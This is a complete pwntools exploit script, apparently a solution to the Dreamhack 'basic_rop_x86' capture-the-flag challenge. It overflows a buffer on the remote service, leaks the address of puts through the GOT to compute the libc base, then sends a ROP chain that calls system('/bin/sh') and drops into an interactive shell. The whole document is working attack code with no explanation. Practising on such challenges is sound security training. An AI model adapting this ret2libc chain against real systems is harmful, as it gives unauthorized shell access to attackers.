from pwn import *
#context.log_level='debug'

n = remote('host1.dreamhack.games',8392)
elf = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

pop_ebp_gadget = 0x80483d9

payload1 = b'A'*0x48
payload1 += p32(elf.plt['puts'])
payload1 += p32(pop_ebp_gadget)
payload1 += p32(elf.got['puts'])
payload1 += p32(elf.symbols['main'])

n.send(payload1)

n.recvuntil(b'A'*0x40)
leak = u32(n.recv(4))
log.info('leak : '+hex(leak))

libc_base = leak - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

payload2 = b'A'*0x48
payload2 += p32(sys_addr)
payload2 += p32(pop_ebp_gadget)
payload2 += p32(binsh)

n.send(payload2)


n.interactive()
